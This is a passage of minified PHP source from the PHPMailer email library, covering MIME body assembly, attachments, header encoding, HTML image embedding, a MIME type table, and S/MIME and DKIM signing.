'alt_inline':$result.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_ALTERNATIVE.';');$result.=$this->textLine(' boundary="'.$this->boundary[1].'"');break;default:$result.=$this->textLine('Content-Type: '.$this->ContentType.'; charset='.$this->CharSet);$ismultipart=false;break;}if(static::ENCODING_7BIT!=$this->Encoding){if($ismultipart){if(static::ENCODING_8BIT==$this->Encoding){$result.=$this->headerLine('Content-Transfer-Encoding',static::ENCODING_8BIT);}}else{$result.=$this->headerLine('Content-Transfer-Encoding',$this->Encoding);}}if('mail'!=$this->Mailer){$result.=static::$LE;}return $result;}public function getSentMIMEMessage(){return rtrim($this->MIMEHeader.$this->mailHeader,"\n\r").static::$LE.static::$LE.$this->MIMEBody;}protected function generateId(){$len=32;if(function_exists('random_bytes')){$bytes=random_bytes($len);}elseif(function_exists('openssl_random_pseudo_bytes')){$bytes=openssl_random_pseudo_bytes($len);}else{$bytes=hash('sha256',uniqid((string)mt_rand(),true),true);}return str_replace(['=','+','/'],'',base64_encode(hash('sha256',$bytes,true)));}public function createBody(){$body='';$this->uniqueid=$this->generateId();$this->boundary[1]='b1_'.$this->uniqueid;$this->boundary[2]='b2_'.$this->uniqueid;$this->boundary[3]='b3_'.$this->uniqueid;if($this->sign_key_file){$body.=$this->getMailMIME().static::$LE;}$this->setWordWrap();$bodyEncoding=$this->Encoding;$bodyCharSet=$this->CharSet;if(static::ENCODING_8BIT==$bodyEncoding and!$this->has8bitChars($this->Body)){$bodyEncoding=static::ENCODING_7BIT;$bodyCharSet='us-ascii';}if(static::ENCODING_BASE64!=$this->Encoding and static::hasLineLongerThanMax($this->Body)){$bodyEncoding=static::ENCODING_QUOTED_PRINTABLE;}$altBodyEncoding=$this->Encoding;$altBodyCharSet=$this->CharSet;if(static::ENCODING_8BIT==$altBodyEncoding and!$this->has8bitChars($this->AltBody)){$altBodyEncoding=static::ENCODING_7BIT;$altBodyCharSet='us-ascii';}if(static::ENCODING_BASE64!=$altBodyEncoding and static::hasLineLongerThanMax($this->AltBody)){$altBodyEncoding=static::ENCODING_QUOTED_PRINTABLE;}$mimepre='This is a multi-part message in MIME format.'.static::$LE;switch($this->message_type){case 'inline':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$bodyCharSet,'',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=static::$LE;$body.=$this->attachAll('inline',$this->boundary[1]);break;case 'attach':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$bodyCharSet,'',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=static::$LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;case 'inline_attach':$body.=$mimepre;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_RELATED.';');$body.=$this->textLine(' boundary="'.$this->boundary[2].'";');$body.=$this->textLine(' type="'.static::CONTENT_TYPE_TEXT_HTML.'"');$body.=static::$LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,'',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=static::$LE;$body.=$this->attachAll('inline',$this->boundary[2]);$body.=static::$LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;case 'alt':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$altBodyCharSet,static::CONTENT_TYPE_PLAINTEXT,$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=static::$LE;$body.=$this->getBoundary($this->boundary[1],$bodyCharSet,static::CONTENT_TYPE_TEXT_HTML,$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=static::$LE;if(!empty($this->Ical)){$body.=$this->getBoundary($this->boundary[1],'',static::CONTENT_TYPE_TEXT_CALENDAR.'; method=REQUEST','');$body.=$this->encodeString($this->Ical,$this->Encoding);$body.=static::$LE;}$body.=$this->endBoundary($this->boundary[1]);break;case 'alt_inline':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$altBodyCharSet,static::CONTENT_TYPE_PLAINTEXT,$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=static::$LE;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_RELATED.';');$body.=$this->textLine(' boundary="'.$this->boundary[2].'";');$body.=$this->textLine(' type="'.static::CONTENT_TYPE_TEXT_HTML.'"');$body.=static::$LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,static::CONTENT_TYPE_TEXT_HTML,$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=static::$LE;$body.=$this->attachAll('inline',$this->boundary[2]);$body.=static::$LE;$body.=$this->endBoundary($this->boundary[1]);break;case 'alt_attach':$body.=$mimepre;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_ALTERNATIVE.';');$body.=$this->textLine(' boundary="'.$this->boundary[2].'"');$body.=static::$LE;$body.=$this->getBoundary($this->boundary[2],$altBodyCharSet,static::CONTENT_TYPE_PLAINTEXT,$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=static::$LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,static::CONTENT_TYPE_TEXT_HTML,$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=static::$LE;if(!empty($this->Ical)){$body.=$this->getBoundary($this->boundary[2],'',static::CONTENT_TYPE_TEXT_CALENDAR.'; method=REQUEST','');$body.=$this->encodeString($this->Ical,$this->Encoding);}$body.=$this->endBoundary($this->boundary[2]);$body.=static::$LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;case 'alt_inline_attach':$body.=$mimepre;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_ALTERNATIVE.';');$body.=$this->textLine(' boundary="'.$this->boundary[2].'"');$body.=static::$LE;$body.=$this->getBoundary($this->boundary[2],$altBodyCharSet,static::CONTENT_TYPE_PLAINTEXT,$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=static::$LE;$body.=$this->textLine('--'.$this->boundary[2]);$body.=$this->headerLine('Content-Type',static::CONTENT_TYPE_MULTIPART_RELATED.';');$body.=$this->textLine(' boundary="'.$this->boundary[3].'";');$body.=$this->textLine(' type="'.static::CONTENT_TYPE_TEXT_HTML.'"');$body.=static::$LE;$body.=$this->getBoundary($this->boundary[3],$bodyCharSet,static::CONTENT_TYPE_TEXT_HTML,$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=static::$LE;$body.=$this->attachAll('inline',$this->boundary[3]);$body.=static::$LE;$body.=$this->endBoundary($this->boundary[2]);$body.=static::$LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;default:$this->Encoding=$bodyEncoding;$body.=$this->encodeString($this->Body,$this->Encoding);break;}if($this->isError()){$body='';if($this->exceptions){throw new Exception($this->lang('empty_message'),self::STOP_CRITICAL);}}elseif($this->sign_key_file){try{if(!defined('PKCS7_TEXT')){throw new Exception($this->lang('extension_missing').'openssl');}$file=fopen('php://temp','rb+');$signed=fopen('php://temp','rb+');fwrite($file,$body);if(empty($this->sign_extracerts_file)){$sign=@openssl_pkcs7_sign($file,$signed,'file://'.realpath($this->sign_cert_file),['file://'.realpath($this->sign_key_file),$this->sign_key_pass],[]);}else{$sign=@openssl_pkcs7_sign($file,$signed,'file://'.realpath($this->sign_cert_file),['file://'.realpath($this->sign_key_file),$this->sign_key_pass],[],PKCS7_DETACHED,$this->sign_extracerts_file);}fclose($file);if($sign){$body=file_get_contents($signed);fclose($signed);$parts=explode("\n\n",$body,2);$this->MIMEHeader.=$parts[0].static::$LE.static::$LE;$body=$parts[1];}else{fclose($signed);throw new Exception($this->lang('signing').openssl_error_string());}}catch(Exception $exc){$body='';if($this->exceptions){throw $exc;}}}return $body;}protected function getBoundary($boundary,$charSet,$contentType,$encoding){$result='';if(''==$charSet){$charSet=$this->CharSet;}if(''==$contentType){$contentType=$this->ContentType;}if(''==$encoding){$encoding=$this->Encoding;}$result.=$this->textLine('--'.$boundary);$result.=sprintf('Content-Type: %s; charset=%s',$contentType,$charSet);$result.=static::$LE;if(static::ENCODING_7BIT!=$encoding){$result.=$this->headerLine('Content-Transfer-Encoding',$encoding);}$result.=static::$LE;return $result;}protected function endBoundary($boundary){return static::$LE.'--'.$boundary.'--'.static::$LE;}protected function setMessageType(){$type=[];if($this->alternativeExists()){$type[]='alt';}if($this->inlineImageExists()){$type[]='inline';}if($this->attachmentExists()){$type[]='attach';}$this->message_type=implode('_',$type);if(''==$this->message_type){$this->message_type='plain';}}public function headerLine($name,$value){return $name.': '.$value.static::$LE;}public function textLine($value){return $value.static::$LE;}public function addAttachment($path,$name='',$encoding=self::ENCODING_BASE64,$type='',$disposition='attachment'){try{if(!static::isPermittedPath($path)||!@is_file($path)){throw new Exception($this->lang('file_access').$path,self::STOP_CONTINUE);}if(''==$type){$type=static::filenameToType($path);}$filename=static::mb_pathinfo($path,PATHINFO_BASENAME);if(''==$name){$name=$filename;}if(!$this->validateEncoding($encoding)){throw new Exception($this->lang('encoding').$encoding);}$this->attachment[]=[0=>$path,1=>$filename,2=>$name,3=>$encoding,4=>$type,5=>false,6=>$disposition,7=>$name,];}catch(Exception $exc){$this->setError($exc->getMessage());$this->edebug($exc->getMessage());if($this->exceptions){throw $exc;}return false;}return true;}public function getAttachments(){return $this->attachment;}protected function attachAll($disposition_type,$boundary){$mime=[];$cidUniq=[];$incl=[];foreach($this->attachment as $attachment){if($attachment[6]==$disposition_type){$string='';$path='';$bString=$attachment[5];if($bString){$string=$attachment[0];}else{$path=$attachment[0];}$inclhash=hash('sha256',serialize($attachment));if(in_array($inclhash,$incl)){continue;}$incl[]=$inclhash;$name=$attachment[2];$encoding=$attachment[3];$type=$attachment[4];$disposition=$attachment[6];$cid=$attachment[7];if('inline'==$disposition and array_key_exists($cid,$cidUniq)){continue;}$cidUniq[$cid]=true;$mime[]=sprintf('--%s%s',$boundary,static::$LE);if(!empty($name)){$mime[]=sprintf('Content-Type: %s; name="%s"%s',$type,$this->encodeHeader($this->secureHeader($name)),static::$LE);}else{$mime[]=sprintf('Content-Type: %s%s',$type,static::$LE);}if(static::ENCODING_7BIT!=$encoding){$mime[]=sprintf('Content-Transfer-Encoding: %s%s',$encoding,static::$LE);}if(!empty($cid)){$mime[]=sprintf('Content-ID: <%s>%s',$this->encodeHeader($this->secureHeader($cid)),static::$LE);}if(!empty($disposition)){$encoded_name=$this->encodeHeader($this->secureHeader($name));if(preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/',$encoded_name)){$mime[]=sprintf('Content-Disposition: %s; filename="%s"%s',$disposition,$encoded_name,static::$LE.static::$LE);}else{if(!empty($encoded_name)){$mime[]=sprintf('Content-Disposition: %s; filename=%s%s',$disposition,$encoded_name,static::$LE.static::$LE);}else{$mime[]=sprintf('Content-Disposition: %s%s',$disposition,static::$LE.static::$LE);}}}else{$mime[]=static::$LE;}if($bString){$mime[]=$this->encodeString($string,$encoding);}else{$mime[]=$this->encodeFile($path,$encoding);}if($this->isError()){return '';}$mime[]=static::$LE;}}$mime[]=sprintf('--%s--%s',$boundary,static::$LE);return implode('',$mime);}protected function encodeFile($path,$encoding=self::ENCODING_BASE64){try{if(!static::isPermittedPath($path)||!file_exists($path)){throw new Exception($this->lang('file_open').$path,self::STOP_CONTINUE);}$file_buffer=file_get_contents($path);if(false===$file_buffer){throw new Exception($this->lang('file_open').$path,self::STOP_CONTINUE);}$file_buffer=$this->encodeString($file_buffer,$encoding);return $file_buffer;}catch(Exception $exc){$this->setError($exc->getMessage());return '';}}public function encodeString($str,$encoding=self::ENCODING_BASE64){$encoded='';switch(strtolower($encoding)){case static::ENCODING_BASE64:$encoded=chunk_split(base64_encode($str),static::STD_LINE_LENGTH,static::$LE);break;case static::ENCODING_7BIT:case static::ENCODING_8BIT:$encoded=static::normalizeBreaks($str);if(substr($encoded,-(strlen(static::$LE)))!=static::$LE){$encoded.=static::$LE;}break;case static::ENCODING_BINARY:$encoded=$str;break;case static::ENCODING_QUOTED_PRINTABLE:$encoded=$this->encodeQP($str);break;default:$this->setError($this->lang('encoding').$encoding);if($this->exceptions){throw new Exception($this->lang('encoding').$encoding);}break;}return $encoded;}public function encodeHeader($str,$position='text'){$matchcount=0;switch(strtolower($position)){case 'phrase':if(!preg_match('/[\200-\377]/',$str)){$encoded=addcslashes($str,"\0..\37\177\\\"");if(($str==$encoded)and!preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/',$str)){return $encoded;}return "\"$encoded\"";}$matchcount=preg_match_all('/[^\040\041\043-\133\135-\176]/',$str,$matches);break;case 'comment':$matchcount=preg_match_all('/[()"]/',$str,$matches);case 'text':default:$matchcount += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/',$str,$matches);break;}$lengthsub='mail'==$this->Mailer?13:0;$maxlen=static::STD_LINE_LENGTH-$lengthsub;if($matchcount>strlen($str)/3){$encoding='B';$maxlen=static::STD_LINE_LENGTH-$lengthsub-8-strlen($this->CharSet);if($this->hasMultiBytes($str)){$encoded=$this->base64EncodeWrapMB($str,"\n");}else{$encoded=base64_encode($str);$maxlen -= $maxlen % 4;$encoded=trim(chunk_split($encoded,$maxlen,"\n"));}$encoded=preg_replace('/^(.*)$/m',' =?'.$this->CharSet."?$encoding?\\1?=",$encoded);}elseif($matchcount>0){$encoding='Q';$maxlen=static::STD_LINE_LENGTH-$lengthsub-8-strlen($this->CharSet);$encoded=$this->encodeQ($str,$position);$encoded=$this->wrapText($encoded,$maxlen,true);$encoded=str_replace('='.static::$LE,"\n",trim($encoded));$encoded=preg_replace('/^(.*)$/m',' =?'.$this->CharSet."?$encoding?\\1?=",$encoded);}elseif(strlen($str)>$maxlen){$encoded=trim($this->wrapText($str,$maxlen,false));if($str==$encoded){$encoded=trim(chunk_split($str,static::STD_LINE_LENGTH,static::$LE));}$encoded=str_replace(static::$LE,"\n",trim($encoded));$encoded=preg_replace('/^(.*)$/m',' \\1',$encoded);}else{return $str;}return trim(static::normalizeBreaks($encoded));}public function hasMultiBytes($str){if(function_exists('mb_strlen')){return strlen($str)>mb_strlen($str,$this->CharSet);}return false;}public function has8bitChars($text){return (bool) preg_match('/[\x80-\xFF]/',$text);}public function base64EncodeWrapMB($str,$linebreak=null){$start='=?'.$this->CharSet.'?B?';$end='?=';$encoded='';if(null===$linebreak){$linebreak=static::$LE;}$mb_length=mb_strlen($str,$this->CharSet);$length=75-strlen($start)-strlen($end);$ratio=$mb_length/strlen($str);$avgLength=floor($length*$ratio*.75);for($i=0;$i<$mb_length;$i += $offset){$lookBack=0;do{$offset=$avgLength-$lookBack;$chunk=mb_substr($str,$i,$offset,$this->CharSet);$chunk=base64_encode($chunk);++$lookBack;}while(strlen($chunk)>$length);$encoded.=$chunk.$linebreak;}return substr($encoded,0,-strlen($linebreak));}public function encodeQP($string){return static::normalizeBreaks(quoted_printable_encode($string));}public function encodeQ($str,$position='text'){$pattern='';$encoded=str_replace(["\r","\n"],'',$str);switch(strtolower($position)){case 'phrase':$pattern='^A-Za-z0-9!*+\/ -';break;case 'comment':$pattern='\(\)"';case 'text':default:$pattern='\000-\011\013\014\016-\037\075\077\137\177-\377'.$pattern;break;}$matches=[];if(preg_match_all("/[{$pattern}]/",$encoded,$matches)){$eqkey=array_search('=',$matches[0]);if(false!==$eqkey){unset($matches[0][$eqkey]);array_unshift($matches[0],'=');}foreach(array_unique($matches[0])as $char){$encoded=str_replace($char,'='.sprintf('%02X',ord($char)),$encoded);}}return str_replace(' ','_',$encoded);}public function addStringAttachment($string,$filename,$encoding=self::ENCODING_BASE64,$type='',$disposition='attachment'){try{if(''==$type){$type=static::filenameToType($filename);}if(!$this->validateEncoding($encoding)){throw new Exception($this->lang('encoding').$encoding);}$this->attachment[]=[0=>$string,1=>$filename,2=>static::mb_pathinfo($filename,PATHINFO_BASENAME),3=>$encoding,4=>$type,5=>true,6=>$disposition,7=>0,];}catch(Exception $exc){$this->setError($exc->getMessage());$this->edebug($exc->getMessage());if($this->exceptions){throw $exc;}return false;}return true;}public function addEmbeddedImage($path,$cid,$name='',$encoding=self::ENCODING_BASE64,$type='',$disposition='inline'){try{if(!static::isPermittedPath($path)||!@is_file($path)){throw new Exception($this->lang('file_access').$path,self::STOP_CONTINUE);}if(''==$type){$type=static::filenameToType($path);}if(!$this->validateEncoding($encoding)){throw new Exception($this->lang('encoding').$encoding);}$filename=static::mb_pathinfo($path,PATHINFO_BASENAME);if(''==$name){$name=$filename;}$this->attachment[]=[0=>$path,1=>$filename,2=>$name,3=>$encoding,4=>$type,5=>false,6=>$disposition,7=>$cid,];}catch(Exception $exc){$this->setError($exc->getMessage());$this->edebug($exc->getMessage());if($this->exceptions){throw $exc;}return false;}return true;}public function addStringEmbeddedImage($string,$cid,$name='',$encoding=self::ENCODING_BASE64,$type='',$disposition='inline'){try{if(''==$type and!empty($name)){$type=static::filenameToType($name);}if(!$this->validateEncoding($encoding)){throw new Exception($this->lang('encoding').$encoding);}$this->attachment[]=[0=>$string,1=>$name,2=>$name,3=>$encoding,4=>$type,5=>true,6=>$disposition,7=>$cid,];}catch(Exception $exc){$this->setError($exc->getMessage());$this->edebug($exc->getMessage());if($this->exceptions){throw $exc;}return false;}return true;}protected function validateEncoding($encoding){return in_array($encoding,[self::ENCODING_7BIT,self::ENCODING_QUOTED_PRINTABLE,self::ENCODING_BASE64,self::ENCODING_8BIT,self::ENCODING_BINARY,],true);}protected function cidExists($cid){foreach($this->attachment as $attachment){if('inline'==$attachment[6]and $cid==$attachment[7]){return true;}}return false;}public function inlineImageExists(){foreach($this->attachment as $attachment){if('inline'==$attachment[6]){return true;}}return false;}public function attachmentExists(){foreach($this->attachment as $attachment){if('attachment'==$attachment[6]){return true;}}return false;}public function alternativeExists(){return!empty($this->AltBody);}public function clearQueuedAddresses($kind){$this->RecipientsQueue=array_filter($this->RecipientsQueue,function($params)use($kind){return $params[0]!=$kind;});}public function clearAddresses(){foreach($this->to as $to){unset($this->all_recipients[strtolower($to[0])]);}$this->to=[];$this->clearQueuedAddresses('to');}public function clearCCs(){foreach($this->cc as $cc){unset($this->all_recipients[strtolower($cc[0])]);}$this->cc=[];$this->clearQueuedAddresses('cc');}public function clearBCCs(){foreach($this->bcc as $bcc){unset($this->all_recipients[strtolower($bcc[0])]);}$this->bcc=[];$this->clearQueuedAddresses('bcc');}public function clearReplyTos(){$this->ReplyTo=[];$this->ReplyToQueue=[];}public function clearAllRecipients(){$this->to=[];$this->cc=[];$this->bcc=[];$this->all_recipients=[];$this->RecipientsQueue=[];}public function clearAttachments(){$this->attachment=[];}public function clearCustomHeaders(){$this->CustomHeader=[];}protected function setError($msg){++$this->error_count;if('smtp'==$this->Mailer and null!==$this->smtp){$lasterror=$this->smtp->getError();if(!empty($lasterror['error'])){$msg.=$this->lang('smtp_error').$lasterror['error'];if(!empty($lasterror['detail'])){$msg.=' Detail: '.$lasterror['detail'];}if(!empty($lasterror['smtp_code'])){$msg.=' SMTP code: '.$lasterror['smtp_code'];}if(!empty($lasterror['smtp_code_ex'])){$msg.=' Additional SMTP info: '.$lasterror['smtp_code_ex'];}}}$this->ErrorInfo=$msg;}public static function rfcDate(){date_default_timezone_set(@date_default_timezone_get());return date('D, j M Y H:i:s O');}protected function serverHostname(){$result='';if(!empty($this->Hostname)){$result=$this->Hostname;}elseif(isset($_SERVER)and array_key_exists('SERVER_NAME',$_SERVER)){$result=$_SERVER['SERVER_NAME'];}elseif(function_exists('gethostname')and gethostname()!==false){$result=gethostname();}elseif(php_uname('n')!==false){$result=php_uname('n');}if(!static::isValidHost($result)){return 'localhost.localdomain';}return $result;}public static function isValidHost($host){if(empty($host)or!is_string($host)or strlen($host)>256){return false;}if(trim($host,'[]')!=$host){return (bool) filter_var(trim($host,'[]'),FILTER_VALIDATE_IP,FILTER_FLAG_IPV6);}if(is_numeric(str_replace('.','',$host))){return (bool) filter_var($host,FILTER_VALIDATE_IP,FILTER_FLAG_IPV4);}if(filter_var('http://'.$host,FILTER_VALIDATE_URL)){return true;}return false;}protected function lang($key){if(count($this->language)<1){$this->setLanguage('en');}if(array_key_exists($key,$this->language)){if('smtp_connect_failed'==$key){return $this->language[$key].' https://github.com/PHPMailer/PHPMailer/wiki/Troubleshooting';}return $this->language[$key];}return $key;}public function isError(){return $this->error_count>0;}public function addCustomHeader($name,$value=null){if(null===$value){$this->CustomHeader[]=explode(':',$name,2);}else{$this->CustomHeader[]=[$name,$value];}}public function getCustomHeaders(){return $this->CustomHeader;}public function msgHTML($message,$basedir='',$advanced=false){preg_match_all('/(src|background)=["\'](.*)["\']/Ui',$message,$images);if(array_key_exists(2,$images)){if(strlen($basedir)>1&&'/'!=substr($basedir,-1)){$basedir.='/';}foreach($images[2]as $imgindex=>$url){if(preg_match('#^data:(image/(?:jpe?g|gif|png));?(base64)?,(.+)#',$url,$match)){if(count($match)==4 and static::ENCODING_BASE64==$match[2]){$data=base64_decode($match[3]);}elseif(''==$match[2]){$data=rawurldecode($match[3]);}else{continue;}$cid=hash('sha256',$data).'@phpmailer.0';if(!$this->cidExists($cid)){$this->addStringEmbeddedImage($data,$cid,'embed'.$imgindex,static::ENCODING_BASE64,$match[1]);}$message=str_replace($images[0][$imgindex],$images[1][$imgindex].'="cid:'.$cid.'"',$message);continue;}if(!empty($basedir)and(strpos($url,'..')===false)and 0!==strpos($url,'cid:')and!preg_match('#^[a-z][a-z0-9+.-]*:?//#i',$url)){$filename=static::mb_pathinfo($url,PATHINFO_BASENAME);$directory=dirname($url);if('.'==$directory){$directory='';}$cid=hash('sha256',$url).'@phpmailer.0';if(strlen($basedir)>1 and '/'!=substr($basedir,-1)){$basedir.='/';}if(strlen($directory)>1 and '/'!=substr($directory,-1)){$directory.='/';}if($this->addEmbeddedImage($basedir.$directory.$filename,$cid,$filename,static::ENCODING_BASE64,static::_mime_types((string)static::mb_pathinfo($filename,PATHINFO_EXTENSION)))){$message=preg_replace('/'.$images[1][$imgindex].'=["\']'.preg_quote($url,'/').'["\']/Ui',$images[1][$imgindex].'="cid:'.$cid.'"',$message);}}}}$this->isHTML(true);$this->Body=static::normalizeBreaks($message);$this->AltBody=static::normalizeBreaks($this->html2text($message,$advanced));if(!$this->alternativeExists()){$this->AltBody='This is an HTML-only message. To view it, activate HTML in your email application.'.static::$LE;}return $this->Body;}public function html2text($html,$advanced=false){if(is_callable($advanced)){return call_user_func($advanced,$html);}return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si','',$html))),ENT_QUOTES,$this->CharSet);}public static function _mime_types($ext=''){$mimes=['xl'=>'application/excel','js'=>'application/javascript','hqx'=>'application/mac-binhex40','cpt'=>'application/mac-compactpro','bin'=>'application/macbinary','doc'=>'application/msword','word'=>'application/msword','xlsx'=>'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','xltx'=>'application/vnd.openxmlformats-officedocument.spreadsheetml.template','potx'=>'application/vnd.openxmlformats-officedocument.presentationml.template','ppsx'=>'application/vnd.openxmlformats-officedocument.presentationml.slideshow','pptx'=>'application/vnd.openxmlformats-officedocument.presentationml.presentation','sldx'=>'application/vnd.openxmlformats-officedocument.presentationml.slide','docx'=>'application/vnd.openxmlformats-officedocument.wordprocessingml.document','dotx'=>'application/vnd.openxmlformats-officedocument.wordprocessingml.template','xlam'=>'application/vnd.ms-excel.addin.macroEnabled.12','xlsb'=>'application/vnd.ms-excel.sheet.binary.macroEnabled.12','class'=>'application/octet-stream','dll'=>'application/octet-stream','dms'=>'application/octet-stream','exe'=>'application/octet-stream','lha'=>'application/octet-stream','lzh'=>'application/octet-stream','psd'=>'application/octet-stream','sea'=>'application/octet-stream','so'=>'application/octet-stream','oda'=>'application/oda','pdf'=>'application/pdf','ai'=>'application/postscript','eps'=>'application/postscript','ps'=>'application/postscript','smi'=>'application/smil','smil'=>'application/smil','mif'=>'application/vnd.mif','xls'=>'application/vnd.ms-excel','ppt'=>'application/vnd.ms-powerpoint','wbxml'=>'application/vnd.wap.wbxml','wmlc'=>'application/vnd.wap.wmlc','dcr'=>'application/x-director','dir'=>'application/x-director','dxr'=>'application/x-director','dvi'=>'application/x-dvi','gtar'=>'application/x-gtar','php3'=>'application/x-httpd-php','php4'=>'application/x-httpd-php','php'=>'application/x-httpd-php','phtml'=>'application/x-httpd-php','phps'=>'application/x-httpd-php-source','swf'=>'application/x-shockwave-flash','sit'=>'application/x-stuffit','tar'=>'application/x-tar','tgz'=>'application/x-tar','xht'=>'application/xhtml+xml','xhtml'=>'application/xhtml+xml','zip'=>'application/zip','mid'=>'audio/midi','midi'=>'audio/midi','mp2'=>'audio/mpeg','mp3'=>'audio/mpeg','m4a'=>'audio/mp4','mpga'=>'audio/mpeg','aif'=>'audio/x-aiff','aifc'=>'audio/x-aiff','aiff'=>'audio/x-aiff','ram'=>'audio/x-pn-realaudio','rm'=>'audio/x-pn-realaudio','rpm'=>'audio/x-pn-realaudio-plugin','ra'=>'audio/x-realaudio','wav'=>'audio/x-wav','mka'=>'audio/x-matroska','bmp'=>'image/bmp','gif'=>'image/gif','jpeg'=>'image/jpeg','jpe'=>'image/jpeg','jpg'=>'image/jpeg','png'=>'image/png','tiff'=>'image/tiff','tif'=>'image/tiff','webp'=>'image/webp','heif'=>'image/heif','heifs'=>'image/heif-sequence','heic'=>'image/heic','heics'=>'image/heic-sequence','eml'=>'message/rfc822','css'=>'text/css','html'=>'text/html','htm'=>'text/html','shtml'=>'text/html','log'=>'text/plain','text'=>'text/plain','txt'=>'text/plain','rtx'=>'text/richtext','rtf'=>'text/rtf','vcf'=>'text/vcard','vcard'=>'text/vcard','ics'=>'text/calendar','xml'=>'text/xml','xsl'=>'text/xml','wmv'=>'video/x-ms-wmv','mpeg'=>'video/mpeg','mpe'=>'video/mpeg','mpg'=>'video/mpeg','mp4'=>'video/mp4','m4v'=>'video/mp4','mov'=>'video/quicktime','qt'=>'video/quicktime','rv'=>'video/vnd.rn-realvideo','avi'=>'video/x-msvideo','movie'=>'video/x-sgi-movie','webm'=>'video/webm','mkv'=>'video/x-matroska',];$ext=strtolower($ext);if(array_key_exists($ext,$mimes)){return $mimes[$ext];}return 'application/octet-stream';}public static function filenameToType($filename){$qpos=strpos($filename,'?');if(false!==$qpos){$filename=substr($filename,0,$qpos);}$ext=static::mb_pathinfo($filename,PATHINFO_EXTENSION);return static::_mime_types($ext);}public static function mb_pathinfo($path,$options=null){$ret=['dirname'=>'','basename'=>'','extension'=>'','filename'=>''];$pathinfo=[];if(preg_match('#^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^.\\\\/]+?)|))[\\\\/.]*$#m',$path,$pathinfo)){if(array_key_exists(1,$pathinfo)){$ret['dirname']=$pathinfo[1];}if(array_key_exists(2,$pathinfo)){$ret['basename']=$pathinfo[2];}if(array_key_exists(5,$pathinfo)){$ret['extension']=$pathinfo[5];}if(array_key_exists(3,$pathinfo)){$ret['filename']=$pathinfo[3];}}switch($options){case PATHINFO_DIRNAME:case 'dirname':return $ret['dirname'];case PATHINFO_BASENAME:case 'basename':return $ret['basename'];case PATHINFO_EXTENSION:case 'extension':return $ret['extension'];case PATHINFO_FILENAME:case 'filename':return $ret['filename'];default:return $ret;}}public function set($name,$value=''){if(property_exists($this,$name)){$this->$name=$value;return true;}$this->setError($this->lang('variable_set').$name);return false;}public function secureHeader($str){return trim(str_replace(["\r","\n"],'',$str));}public static function normalizeBreaks($text,$breaktype=null){if(null===$breaktype){$breaktype=static::$LE;}$text=str_replace(["\r\n","\r"],"\n",$text);if("\n"!==$breaktype){$text=str_replace("\n",$breaktype,$text);}return $text;}public static function getLE(){return static::$LE;}protected static function setLE($le){static::$LE=$le;}public function sign($cert_filename,$key_filename,$key_pass,$extracerts_filename=''){$this->sign_cert_file=$cert_filename;$this->sign_key_file=$key_filename;$this->sign_key_pass=$key_pass;$this->sign_extracerts_file=$extracerts_filename;}public function DKIM_QP($txt){$line='';$len=strlen($txt);for($i=0;$i<$len;++$i){$ord=ord($txt[$i]);if(((0x21 <= $ord)and($ord <= 0x3A))or $ord==0x3C or((0x3E <= $ord)and($ord <= 0x7E))){$line.=$txt[$i];}else{$line.='='.sprintf('%02X',$ord);}}return $line;}public function DKIM_Sign($signHeader){if(!defined('PKCS7_TEXT')){if($this->exceptions){throw new Exception($this->lang('extension_missing').'openssl');}return '';}$privKeyStr=!empty($this->DKIM_private_string)?$this->DKIM_private_string:file_get_contents($this->DKIM_private);if(''!=$this->DKIM_passphrase){$privKey=openssl_pkey_get_private($privKeyStr,$this->DKIM_passphrase);}else{$privKey=openssl_pkey_get_private($privKeyStr);}if(openssl_sign($signHeader,$signature,$privKey,'sha256WithRSAEncryption')){openssl_pkey_free($privKey);return base64_encode($signature);}openssl_pkey_free($privKey);return '';}public function DKIM_HeaderC($signHeader){$signHeader=preg_replace('/\r\n[ \t]+/',' ',$signHeader);$lines=explode("\r\n",$signHeader);foreach($lines as $key=>$line){if(strpos($line,':')===false){continue;}list($heading,$value)=explode(':',$line,2);$heading=strtolower($heading);$value=preg_replace('/[ \t]{2,}/',' ',$value);$lines[$key]=trim($heading," \t").':'.trim($value," \t");}return implode("\r\n",$lines);}public function DKIM_BodyC($body){if(empty($body)){return "\r\n";}$body=static::normalizeBreaks($body,"\r\n");return rtrim($body,"\r\n")."\r\n";}public function 